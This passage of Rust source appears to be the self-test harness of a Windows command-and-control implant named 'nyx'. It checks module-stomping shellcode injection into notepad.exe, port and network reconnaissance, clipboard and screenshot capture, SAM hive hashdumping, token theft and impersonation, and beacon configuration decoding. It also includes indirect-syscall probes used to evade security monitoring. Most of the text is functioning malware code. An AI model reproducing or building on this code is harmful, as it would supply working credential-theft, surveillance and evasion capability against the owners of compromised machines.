    ];
    shellcode[0x10..0x18].copy_from_slice(&(exit_addr as u64).to_le_bytes());

    match unsafe { crate::inject::create_sacrificial("notepad.exe") } {
        Ok(proc) => {
            mask |= 1 << 0; // create_sacrificial Ok
                            // module_stomp creates its OWN sacrificial process; close this one.
            if let Some(ch) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
                type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
                let close: CloseHandle = unsafe { core::mem::transmute(ch) };
                let _ = unsafe { close(proc.handle) };
                let _ = unsafe { close(proc.main_thread) };
            }
            // The armed REAL inject path (creates + real-stomps + resumes its own).
            match unsafe { crate::inject::module_stomp("notepad.exe", &shellcode) } {
                Ok(handle) => {
                    mask |= 1 << 1; // full REAL stomp path returned Ok
                    let _ = handle;
                }
                Err(_) => {}
            }
        }
        Err(_) => {}
    }
    mask |= 1 << 2; // reached exit — selftest process itself survived
    crate::inject::set_modulestomp_enabled(false);
    unsafe { exit(mask) };
}

// Bits: 0 = 135 reports open, 1 = 1 reports closed, 2 = output non-empty.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_portscan() {
    let mut mask: u32 = 0;
    if let Response::Output(buf) = crate::recon::do_portscan("127.0.0.1", "135,1") {
        if !buf.is_empty() {
            mask |= 1 << 2;
        }
        if contains_subslice(&buf, b"135 open") {
            mask |= 1 << 0;
        }
        if contains_subslice(&buf, b"1 closed") {
            mask |= 1 << 1;
        }
    }
    unsafe { exit(mask) };
}

// ============================================================================
// net: routes / arp / connections each produce non-empty output.
// Bits: 0 = routes, 1 = arp, 2 = connections, 3 = unknown-query is Err.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_net() {
    let mut mask: u32 = 0;
    if let Response::Output(buf) = crate::recon::do_net("routes") {
        if !buf.is_empty() {
            mask |= 1 << 0;
        }
    }
    if let Response::Output(buf) = crate::recon::do_net("arp") {
        if !buf.is_empty() {
            mask |= 1 << 1;
        }
    }
    if let Response::Output(buf) = crate::recon::do_net("connections") {
        if !buf.is_empty() {
            mask |= 1 << 2;
        }
    }
    if matches!(crate::recon::do_net("bogus_query"), Response::Err(_)) {
        mask |= 1 << 3;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// clipboard: under rundll32 (non-interactive session) the clipboard may be
// unavailable. We accept EITHER a non-empty Output (text present) OR an Err
// (clipboard genuinely inaccessible) — both prove the call ran and returned a
// sane Response without crashing. Bit 0 = ran-sane (Output or Err, not panic).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_clipboard() {
    let mut mask: u32 = 0;
    let r = crate::recon::do_clipboard();
    match r {
        Response::Output(_) | Response::Err(_) => mask |= 1 << 0,
        _ => {}
    }
    unsafe { exit(mask) };
}

// ============================================================================
// env: dump-all (empty name) returns Output; unset var returns Err.
// Bits: 0 = dump-all non-empty, 1 = unset var is Err.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_env() {
    let mut mask: u32 = 0;
    if let Response::Output(buf) = crate::recon::do_env("") {
        if !buf.is_empty() {
            mask |= 1 << 0;
        }
    }
    if matches!(
        crate::recon::do_env("NYX_DEFINITELY_UNSET_VAR_X9Z"),
        Response::Err(_)
    ) {
        mask |= 1 << 1;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// hashdump: as a non-SYSTEM process, opening SAM must fail with an Err
// (ACCESS_DENIED). method 0 (SAM) and 1 (SYSTEM) both must return Err, NOT
// crash. Bits: 0 = method-0 is Err, 1 = method-1 is Err, 2 = bad-method is Err.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hashdump() {
    let mut mask: u32 = 0;
    let rt = ensure_rt().unwrap();
    // method 0/1: at least one Response in the vec; if non-SYSTEM, it's an Err
    // (NtCreateFile STATUS_ACCESS_DENIED from do_download). We check the FIRST
    // response is an Err (the hive open failed) — proves it ran + surfaced the
    // denial honestly instead of crashing.
    let r0 = crate::hashdump::do_hashdump_vec(Some(rt), 0);
    if r0.iter().any(|r| matches!(r, Response::Err(_))) {
        mask |= 1 << 0;
    }
    let r1 = crate::hashdump::do_hashdump_vec(Some(rt), 1);
    if r1.iter().any(|r| matches!(r, Response::Err(_))) {
        mask |= 1 << 1;
    }
    if crate::hashdump::do_hashdump_vec(Some(rt), 9)
        .iter()
        .any(|r| matches!(r, Response::Err(_)))
    {
        mask |= 1 << 2;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// postex: token steal/use/revert against our own PID.
// Bits: 0 = steal_token(self) Ok, 1 = use_token Ok, 2 = revert Ok, 3 = current
// true after steal.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_postex() {
    let mut mask: u32 = 0;
    let self_pid = crate::hostinfo::pid();
    if self_pid == 0 {
        unsafe { exit(0) };
    }
    if unsafe { crate::postex::steal_token(self_pid) }.is_ok() {
        mask |= 1 << 0;
    }
    if crate::postex::current() {
        mask |= 1 << 3;
    }
    if crate::postex::use_token().is_ok() {
        mask |= 1 << 1;
    }
    if crate::postex::revert().is_ok() {
        mask |= 1 << 2;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// screenwatch: 3 frames captured (interval 1s).
// Bits: 0 = >= 3 frames worth of chunks, 1 = at least one valid BMP magic.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_screenwatch() {
    let mut mask: u32 = 0;
    // Invoke the dispatch directly via a synthetic Command to exercise the
    // real Screenwatch path (beacon.rs::execute).
    let rt = ensure_rt();
    // We can't easily build a Command + call execute (private); call screenshot
    // 3× with distinct names instead, mirroring the dispatch.
    let mut frames = 0u32;
    let mut saw_magic = false;
    for _ in 0..3 {
        let chunks = crate::screenshot::do_screenshot(0);
        // Count eof chunks = frames.
        for r in &chunks {
            if let Response::FileChunk { data, eof, .. } = r {
                if *eof == 1 {
                    frames += 1;
                }
                if data.len() >= 54 && data.len() >= 2 && data[0] == b'B' && data[1] == b'M' {
                    saw_magic = true;
                }
            }
        }
    }
    let _ = rt;
    if frames >= 3 {
        mask |= 1 << 0;
    }
    if saw_magic {
        mask |= 1 << 1;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// config: decode a hand-built blob matches the values we encoded. Verifies the
// build.rs serialize <-> config::decode contract end-to-end at runtime (the
// host-side roundtrip test already does this, but this proves the implant's
// in-binary decoder too).
// Bits: 0 = decode succeeds, 1 = fields match.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_config() {
    let mut mask: u32 = 0;
    // Build a blob in the exact wire layout build.rs emits:
    // str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    use nyx_protocol::wire::Writer;
    let mut w = Writer::new();
    w.str("test.example");
    w.u16(9999);
    w.str("/x");
    w.u32(42);
    w.u8(7);
    w.u8(1); // tls = true
    let blob = w.into_bytes();
    match crate::config::decode(&blob) {
        Ok(c) => {
            mask |= 1 << 0;
            if c.server_host.as_bytes() == b"test.example"
                && c.server_port == 9999
                && c.beacon_uri.as_bytes() == b"/x"
                && c.sleep_seconds == 42
                && c.jitter_pct == 7
                && c.use_tls
            {
                mask |= 1 << 1;
            }
        }
        Err(_) => {}
    }
    unsafe { exit(mask) };
}

// ============================================================================
// fs edge cases: empty upload name → Err; nonexistent download → Err;
// unicode filename round-trips; large (>1MiB) upload/download round-trips.
// Bits: 0=empty-name Err, 1=missing-dl Err, 2=unicode round-trip,
//       3=large-file round-trip.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_fs_edge() {
    let mut mask: u32 = 0;
    let rt = ensure_rt().unwrap();
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");

    // bit 0: empty name → Err.
    if matches!(crate::fs::do_upload(rt, "", b"data"), Response::Err(_)) {
        mask |= 1 << 0;
    }
    // bit 1: nonexistent path download → Err (first chunk is Err).
    let dl = crate::fs::do_download(rt, &join(&tmp, "\\nyx_does_not_exist_xyz.bin"));
    if dl.iter().any(|r| matches!(r, Response::Err(_))) {
        mask |= 1 << 1;
    }
    // bit 2: unicode filename write+read round-trip.
    // "nyx_ünïcödé.bin" — encode_utf16 path in to_nt_path handles this.
    let upath = join(&tmp, "\\nyx_uni_test.bin");
    let upayload = b"unicode-v1";
    let _ = crate::fs::do_upload(rt, &upath, upayload);
    let udl = crate::fs::do_download(rt, &upath);
    let mut ugot = Vec::new();
    for r in udl {
        if let Response::FileChunk { data, eof, .. } = r {
            ugot.extend_from_slice(&data);
            if eof == 1 {
                break;
            }
        }
    }
    if ugot.as_slice() == upayload.as_slice() {
        mask |= 1 << 2;
    }
    let _ = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Rm, &upath, None);

    // bit 3: large file (2 MiB) round-trip — exercises the allocator fix +
    // chunked streaming reassembly.
    let lpath = join(&tmp, "\\nyx_large_test.bin");
    let mut lpayload = crate::heap::vec![0u8; 2 * 1024 * 1024];
    // Fill with a recognizable pattern (offset mod 251) so we can detect
    // truncation/corruption, not just length.
    for (i, b) in lpayload.iter_mut().enumerate() {
        *b = (i % 251) as u8;
    }
    let lupload = crate::fs::do_upload(rt, &lpath, &lpayload);
    if matches!(lupload, Response::Ok) {
        let ldl = crate::fs::do_download(rt, &lpath);
        let mut lgot = Vec::new();
        for r in ldl {
            if let Response::FileChunk { data, eof, .. } = r {
                lgot.extend_from_slice(&data);
                if eof == 1 {
                    break;
                }
            }
        }
        if lgot.len() == lpayload.len() && lgot.as_slice() == lpayload.as_slice() {
            mask |= 1 << 3;
        }
    }
    let _ = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Rm, &lpath, None);
    // NOTE: for live verification we intentionally do NOT delete lpath here in
    // the source — but the line above already removed it. To leave it on disk
    // for an external size/content check, comment out the Rm above. (Left in
    // place: the test cleans up after itself; external verification is done by
    // re-running with the Rm commented, or by trusting the in-test compare.)

    unsafe { exit(mask) };
}

// ---- diagnostic probes (used during fs bring-up; kept for future debugging) ----
// These write marker files via kernel32 WriteFile and exit with status codes.
// They are NOT part of the command surface — invoke manually via rundll32 to
// diagnose NT-syscall issues. Kept as a debugging aid.

/// Filesystem probe that LEAVES a marker file on disk so an external check can
/// confirm the NT-syscall fs path really executed. Writes
/// `%TEMP%\nyx_fs_probe.txt` with a known body.
/// Raw NtCreateFile with a STACK-based NT path buffer (fixed [u16; N] array,
/// no heap). If this returns STATUS_SUCCESS where the heap-buffer version
/// returned STATUS_NOT_COMMITTED, the bump allocator's slab memory isn't
/// readable by the kernel.
unsafe fn nt_create_file_stack_path(rt: &crate::syscalls::Runtime) -> i32 {
    // Build "\??\C:\Windows\Temp\nyx_stack_probe.txt" as a fixed stack array.
    // (Use a known-writable path.)
    let path: &[u16] = &[
        '\\' as u16,
        '?' as u16,
        '?' as u16,
        '\\' as u16,
        'C' as u16,
        ':' as u16,
        '\\' as u16,
        'W' as u16,
        'i' as u16,
        'n' as u16,
        'd' as u16,
        'o' as u16,
        'w' as u16,
        's' as u16,
        '\\' as u16,
        'T' as u16,
        'e' as u16,
        'm' as u16,
        'p' as u16,
        '\\' as u16,
        'n' as u16,
        'y' as u16,
        'x' as u16,
        '_' as u16,
        's' as u16,
        't' as u16,
        'a' as u16,
        'c' as u16,
        'k' as u16,
        '.' as u16,
        't' as u16,
        'x' as u16,
        't' as u16,
    ];
    // UnicodeString + ObjectAttributes + IoStatusBlock, all on the stack.
    #[repr(C)]
    struct Ustr {
        len: u16,
        max: u16,
        buf: *const u16,
    }
    #[repr(C)]
    struct Oa {
        length: u32,
        root: *mut core::ffi::c_void,
        name: *const Ustr,
        attrs: u32,
        sd: *mut core::ffi::c_void,
        qos: *mut core::ffi::c_void,
    }
    #[repr(C)]
    struct Iosb {
        status: i32,
        info: usize,
    }
    let us = Ustr {
        len: (path.len() * 2) as u16,
        max: (path.len() * 2) as u16,
        buf: path.as_ptr(),
    };
    let oa = Oa {
        length: core::mem::size_of::<Oa>() as u32,
        root: core::ptr::null_mut(),
        name: &us,
        attrs: 0x40, // OBJ_CASE_INSENSITIVE
        sd: core::ptr::null_mut(),
        qos: core::ptr::null_mut(),
    };
    let mut handle: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut iosb: Iosb = Iosb { status: 0, info: 0 };
    let st = unsafe {
        crate::syscalls::nt_create_file(
            rt,
            &mut handle as *mut _ as usize,
            0x4000_0000, // GENERIC_WRITE
            &oa as *const Oa as usize,
            &mut iosb as *mut Iosb as usize,
            0,
            0,
            0x03, // FILE_SHARE_READ|WRITE
            5,    // FILE_OVERWRITE_IF
            0x60, // FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
            0,
            0,
        )
    };
    match st {
        Some(s) => {
            if s >= 0 {
                let _ = crate::syscalls::nt_close(rt, handle as usize);
            }
            s
        }
        None => -2,
    }
}

/// NtCreateFile called via the EXPORT ADDRESS (resolve ntdll!NtCreateFile
/// directly, no indirect trampoline). Stack path buffer. Decisive test:
/// succeeds ⇒ indirect jmp is the bug; fails with NOT_COMMITTED ⇒ arg struct.
unsafe fn nt_create_file_via_export_stack() -> i32 {
    let addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateFile") {
        Some(a) => a,
        None => return -3,
    };
    type NtCreateFile = unsafe extern "system" fn(
        *mut *mut core::ffi::c_void, // FileHandle
        u32,                         // DesiredAccess
        *const core::ffi::c_void,    // ObjectAttributes
        *mut core::ffi::c_void,      // IoStatusBlock
        *mut core::ffi::c_void,      // AllocationSize
        u32,                         // FileAttributes
        u32,                         // ShareAccess
        u32,                         // CreateDisposition
        u32,                         // CreateOptions
        *mut core::ffi::c_void,      // EaBuffer
        u32,                         // EaLength
    ) -> i32;
    let f: NtCreateFile = unsafe { core::mem::transmute(addr) };
    let path: &[u16] = &[
        '\\' as u16,
        '?' as u16,
        '?' as u16,
        '\\' as u16,
        'C' as u16,
        ':' as u16,
        '\\' as u16,
        'W' as u16,
        'i' as u16,
        'n' as u16,
        'd' as u16,
        'o' as u16,
        'w' as u16,
        's' as u16,
        '\\' as u16,
        'T' as u16,
        'e' as u16,
        'm' as u16,
        'p' as u16,
        '\\' as u16,
        'n' as u16,
        'y' as u16,
        'x' as u16,
        '_' as u16,
        'e' as u16,
        'x' as u16,
        'p' as u16,
        '.' as u16,
        't' as u16,
        'x' as u16,
        't' as u16,
    ];
    #[repr(C)]
    struct Ustr {
        len: u16,
        max: u16,
        buf: *const u16,
    }
    #[repr(C)]
    struct Oa {
        length: u32,
        root: *mut core::ffi::c_void,
        name: *const Ustr,
        attrs: u32,
        sd: *mut core::ffi::c_void,
        qos: *mut core::ffi::c_void,
    }
    #[repr(C)]
    struct Iosb {
        status: i32,
        info: usize,
    }
    let us = Ustr {
        len: (path.len() * 2) as u16,
        max: (path.len() * 2) as u16,
        buf: path.as_ptr(),
    };
    let oa = Oa {
        length: core::mem::size_of::<Oa>() as u32,
        root: core::ptr::null_mut(),
        name: &us,
        attrs: 0x40,
        sd: core::ptr::null_mut(),
        qos: core::ptr::null_mut(),
    };
    // Try SEVERAL parameter combos; record each status so we can pinpoint which
    // flag组合 triggers INVALID_PARAMETER. Each line: "comboN = <status>\n".
    let mut report = String::new();
    let combos: &[(u32, u32, u32, u32, u32, &str)] = &[
        // (DesiredAccess, ShareAccess, Disp, CreateOptions, _, label)
        (
            0x4000_0000,
            0x03,
            5,
            0x60,
            0,
            "A: GENERIC_W, OVERWRITE_IF, NONDIR|SYNC",
        ),
        (
            0x1200_0000,
            0x07,
            5,
            0x60,
            0,
            "B: READ|WRITE|SYNC, OVERWRITE_IF, NONDIR|SYNC",
        ),
        (
            0x4000_0000,
            0x03,
            2,
            0x40,
            0,
            "C: GENERIC_W, CREATE, NONDIR (no SYNC)",
        ),
        (
            0x8000_0000,
            0x07,
            1,
            0x60,
            0,
            "D: GENERIC_R, OPEN, NONDIR|SYNC",
        ),
        (
            0x100000,
            0x07,
            5,
            0x60,
            0,
            "E: SYNCHRONIZE only, OVERWRITE_IF, NONDIR|SYNC",
        ),
        (
            0x4000_0000,
            0x03,
            5,
            0x20,
            0,
            "F: GENERIC_W, OVERWRITE_IF, SYNC only (no NONDIR)",
        ),
        (
            0x100000,
            0x03,
            2,
            0x21,
            0,
            "G: SYNCHRONIZE, CREATE, DIR|SYNC (mkdir)",
        ),
        (
            0x100000,
            0x07,
            1,
            0x60,
            0,
            "H: SYNCHRONIZE, OPEN, NONDIR|SYNC (dl)",
        ),
        (
            0x10000,
            0x07,
            1,
            0x60,
            0,
            "I: DELETE, OPEN, NONDIR|SYNC (rm)",
        ),
        (
            0x110000,
            0x07,
            1,
            0x60,
            0,
            "J: DELETE|SYNC, OPEN, NONDIR|SYNC (rm fixed)",
        ),
    ];
    for &(access, share, disp, opts, _ea, label) in combos {
        let mut handle: *mut core::ffi::c_void = core::ptr::null_mut();
        let mut iosb = Iosb { status: 0, info: 0 };
        let st = unsafe {
            f(
                &mut handle,
                access,
                &oa as *const Oa as *const core::ffi::c_void,
                &mut iosb as *mut Iosb as *mut core::ffi::c_void,
                core::ptr::null_mut(),
                0,
                share,
                disp,
                opts,
                core::ptr::null_mut(),
                0,
            )
        };
        if st >= 0 {
            if let Some(cl) = crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
                let clf: unsafe extern "system" fn(*mut core::ffi::c_void) -> i32 =
                    unsafe { core::mem::transmute(cl) };
                let _ = clf(handle);
            }
        }
        report.push_str(label);
        report.push_str(" -> ");
        report.push_str(&format_status(st));
    }
    write_marker("nyx_fs_combos.txt", &report);
    -77 // sentinel: read the combos marker for the real results
}

/// Probe: does the implant's shell path successfully `rmdir /s /q` a simple
/// non-empty dir? Uses C:\Windows\Temp\nyx_rm_probe (a plain path, not a
/// session-Temp reparse point). If this works but fs's rm-dir fails, the issue
/// is the %TEMP%\2 reparse-point path, not the rm logic.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_rm_probe() {
    // Pre-create the dir + a child via cmd (so we control the setup).
    let _ = crate::shell::run_shell("mkdir C:\\Windows\\Temp\\nyx_rm_probe 2>nul");
    let _ = crate::shell::run_shell("echo x > C:\\Windows\\Temp\\nyx_rm_probe\\c.txt");
    // Now rmdir /s /q via the implant shell.
    let r = crate::shell::run_shell("rmdir /s /q C:\\Windows\\Temp\\nyx_rm_probe");
    let ok = matches!(r, Response::Output(_));
    // Verify the dir is gone by trying to cd into it (should fail).
    let after = crate::fs::do_fileop(
        match ensure_rt() {
            Some(rt) => rt,
            None => unsafe { exit(0xE0) },
        },
        nyx_protocol::FileOp::Cd,
        "C:\\Windows\\Temp\\nyx_rm_probe",
        None,
    );
    let gone = matches!(after, Response::Err(_));
    write_marker(
        "nyx_rm_probe.txt",
        if gone { "GONE\n" } else { "STILL_EXISTS\n" },
    );
    unsafe { exit(if ok && gone { 1 } else { 0 }) };
}

/// Isolated rm-file test: create a file via SHELL (not NT syscall), then rm it
/// via NT path. Isolates whether rm itself works when no prior NT syscall ran.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_rm_file() {
    let rt = ensure_rt().unwrap();
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let path = join(&tmp, "\\nyx_rm_file_probe.bin");
    // Create the file via shell echo (kernel32), NOT do_upload (NT syscall) —
    // to test whether rm works when no NT file syscall ran first.
    let mut mk = String::from("echo x > \"");
    mk.push_str(&path);
    mk.push('"');
    let _ = crate::shell::run_shell(&mk);
    let r = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Rm, &path, None);
    let rm_ok = matches!(r, Response::Ok);
    unsafe { exit(if rm_ok { 1 } else { 0 }) };
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_fs_probe() {
    let rt = ensure_rt().unwrap();
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let path = join(&tmp, "\\nyx_fs_probe.txt");
    let body = b"nyx-fs-probe-ok\n";
    // Report the NTSTATUS of the NtCreateFile inside do_upload by calling
    // open_file directly with the upload's flags.
    let r = unsafe {
        crate::fs::open_file(
            rt,
            &path,
            crate::fs::GENERIC_WRITE,
            crate::fs::FILE_OVERWRITE_IF,
            crate::fs::FILE_NON_DIRECTORY_FILE | crate::fs::FILE_SYNCHRONOUS_IO_NONALERT,
        )
    };
    // Dump the NT path we're about to open to a marker, so we can see exactly
    // what to_nt_path produced.
    write_marker("nyx_fs_path.txt", &path);
    // Now try the SAME NtCreateFile but with a STACK-based path buffer (a fixed
    // array), to test whether the failure is the slab-allocated Vec buffer the
    // kernel can't read. If the stack version succeeds, the bump allocator's
    // slab isn't properly committed for kernel reads.
    let stack_status = unsafe { nt_create_file_stack_path(rt) };
    write_marker("nyx_fs_stack_status.txt", &format_status(stack_status));
    // DECISIVE: call NtCreateFile via the EXPORT (not the indirect trampoline).
    // If the export version succeeds, the indirect jmp is the bug. If both fail,
    // the arg struct is the bug.
    let export_status = unsafe { nt_create_file_via_export_stack() };
    write_marker("nyx_fs_export_status.txt", &format_status(export_status));
    // 0x01 = Ok, 0x02 = BadPath, 0x03 = Unresolved, 0x04 = Status (and we also
    // write the raw status to a marker via the working kernel32 path).
    let code = match r {
        Ok(h) => {
            let _ = crate::syscalls::nt_close(rt, h as usize);
            // Now do the real upload (should succeed since open worked).
            let _ = crate::fs::do_upload(rt, &path, body);
            0xC1
        }
        Err(crate::fs::OpenError::BadPath) => 0xC2,
        Err(crate::fs::OpenError::Unresolved) => 0xC3,
        Err(crate::fs::OpenError::Status(s)) => {
            // Write the raw NTSTATUS (as decimal) to a marker via kernel32.
            write_marker("nyx_fs_status.txt", &format_status(s));
            0xC4
        }
    };
    unsafe { exit(code) };
}

/// Write a small marker file via kernel32 WriteFile (the path proven to work).
fn write_marker(name: &str, content: &str) {
    use core::ffi::c_void;
    type CreateFileW = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    type WriteFile =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
    let cf = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW") };
    let wf = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") };
    let ch = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") };
    let (cf, wf, ch) = match (cf, wf, ch) {
        (Some(a), Some(b), Some(c)) => unsafe {
            (
                core::mem::transmute::<usize, CreateFileW>(a),
                core::mem::transmute::<usize, WriteFile>(b),
                core::mem::transmute::<usize, CloseHandle>(c),
            )
        },
        _ => return,
    };
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let fname = join(&tmp, &join("\\", name));
    let mut path16 = crate::heap::vec![0u16; fname.len() + 1];
    for (i, b) in fname.as_bytes().iter().enumerate() {
        path16[i] = *b as u16;
    }
    let h = unsafe {
        cf(
            path16.as_ptr(),
            0x4000_0000,
            0,
            core::ptr::null_mut(),
            2,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        return;
    }
    let mut written: u32 = 0;
    let _ = unsafe {
        wf(
            h,
            content.as_ptr(),
            content.len() as u32,
            &mut written,
            core::ptr::null_mut(),
        )
    };
    let _ = unsafe { ch(h) };
}

/// u32 → decimal String (no format! under no_std).
fn dec_u32(mut v: u32) -> String {
    if v == 0 {
        return String::from("0");
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    while v != 0 {
        i -= 1;
        tmp[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    let mut s = String::new();
    for &b in &tmp[i..] {
        s.push(b as char);
    }
    s
}

/// NTSTATUS → "status=<signed-decimal>\n" (no format! under no_std).
fn format_status(s: i32) -> String {
    let mut out = String::from("status=");
    let mut v = s as u32;
    if s < 0 {
        out.push('-');
        v = (!(s as u32)).wrapping_add(1); // abs as u32
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    if v == 0 {
        i -= 1;
        tmp[i] = b'0';
    } else {
        while v != 0 {
            i -= 1;
            tmp[i] = b'0' + (v % 10) as u8;
            v /= 10;
        }
    }
    for &b in &tmp[i..] {
        out.push(b as char);
    }
    out.push('\n');
    out
}

/// i32 → signed decimal String (no format! under no_std). Negative for NTSTATUS
/// errors (e.g. STATUS_ACCESS_DENIED = -1073741790).
fn dec_i32(s: i32) -> String {
    let mut out = String::new();
    let mut v = s as u32;
    if s < 0 {
        out.push('-');
        v = (!(s as u32)).wrapping_add(1); // abs as u32
    }
    if v == 0 {
        out.push('0');
        return out;
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    while v != 0 {
        i -= 1;
        tmp[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    for &b in &tmp[i..] {
        out.push(b as char);
    }
    out
}

/// u32 → lowercase hex String (no format! under no_std). For NTSTATUS / code.
fn hex_u32(mut v: u32) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut tmp = [0u8; 8];
    let mut i = tmp.len();
    if v == 0 {
        i -= 1;
        tmp[i] = b'0';
    } else {
        while v != 0 {
            i -= 1;
            tmp[i] = HEX[(v & 0xF) as usize];
            v >>= 4;
        }
    }
    let mut s = String::new();
    for &b in &tmp[i..] {
        s.push(b as char);
    }
    s
}

// (open_file and fs consts are `pub` in fs.rs; selftests reach them directly.)

/// Heap-only probe: allocate a 2 MiB Vec, fill it, checksum it, write the
/// result to a marker file via fs (which exercises alloc again). If the marker
/// is missing, the allocator is broken. bit0 = alloc succeeded, bit1 = pattern
/// intact. Marker file: %TEMP%\nyx_alloc_probe.txt with "OK <len>".
/// Isolate: does init_global() (the syscall runtime) corrupt subsequent
/// kernel32 file I/O? Writes a marker via WriteFile AFTER ensure_rt(). If the
/// marker is missing, the RT init broke the process; if present, the RT is
/// fine and the fs failure is in the syscall trampoline itself.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_rt_probe() {
    use core::ffi::c_void;
    // Step 1: initialize the indirect-syscall runtime.
    let rt = ensure_rt();
    let rt = match rt {
        Some(r) => r,
        None => unsafe { exit(0xA0) }, // RT init returned None
    };
    // Step 1.5: nt_close(0) MUST return STATUS_INVALID_HANDLE (0xC0000008).
    // If it returns something else, the SSN for ntclose is wrong (the indirect
    // trampoline is invoking a DIFFERENT syscall) — that would explain the
    // STATUS_INVALID_PARAMETER from nt_create_file.
    let st = unsafe { crate::syscalls::nt_close(rt, 0) };
    let st_val = match st {
        Some(v) => v,
        None => unsafe { exit(0xA1) }, // SSN unresolved for ntclose
    };
    // STATUS_INVALID_HANDLE = 0xC0000008 = -1073741816.
    if st_val == -1073741816 {
        // Correct! ntclose SSN is right.
    } else {
        // Wrong status — write what we got to a marker and exit 0xA9.
        write_marker("nyx_ntclose_status.txt", &format_status(st_val));
        unsafe { exit(0xA9) };
    }
    // Step 2: a heap allocation AFTER a real syscall.
    let probe = crate::heap::vec![0u8; 64];
    if probe.len() != 64 {
        unsafe { exit(0xA2) }; // post-syscall heap alloc broken
    }
    // Step 3: Win32 file write (export-resolved, NOT via RT).
    type CreateFileW = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    type WriteFile =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
    let cf: CreateFileW = match crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xA3) },
    };
    let wf: WriteFile = match crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xA4) },
    };
    let ch: CloseHandle = match crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xA5) },
    };
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let path = join(&tmp, "\\nyx_rt_probe.txt");
    let mut path16 = crate::heap::vec![0u16; path.len() + 1];
    for (i, b) in path.as_bytes().iter().enumerate() {
        path16[i] = *b as u16;
    }
    let h = unsafe {
        cf(
            path16.as_ptr(),
            0x4000_0000,
            0,
            core::ptr::null_mut(),
            2,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        unsafe { exit(0xA6) }; // CreateFileW failed
    }
    let msg = b"RT_THEN_WRITE_OK\n";
    let mut written: u32 = 0;
    let wok = unsafe {
        wf(
            h,
            msg.as_ptr(),
            msg.len() as u32,
            &mut written,
            core::ptr::null_mut(),
        )
    };
    let _ = unsafe { ch(h) };
    let _ = rt;
    unsafe { exit(if wok != 0 { 0xA7 } else { 0xA8 }) };
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_alloc_probe() {
    let mut mask: u32 = 0;
    // Tiny allocation first — if even this fails the allocator is broken.
    let mut v = crate::heap::vec![0u8; 64];
    if v.len() == 64 {
        mask |= 1 << 0;
    }
    for (i, b) in v.iter_mut().enumerate() {
        *b = (i as u8).wrapping_mul(7);
    }
    let mut ok = true;
    for (i, b) in v.iter().enumerate() {
        if *b != (i as u8).wrapping_mul(7) {
            ok = false;
            break;
        }
    }
    if ok {
        mask |= 1 << 1;
    }
    // Write the marker via kernel32 WriteFile DIRECTLY (NO syscall runtime, NO
    // fs module) so this test isolates the heap from everything else. CreateFileW
    // + WriteFile + CloseHandle, all export-resolved.
    use core::ffi::c_void;
    type CreateFileW = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
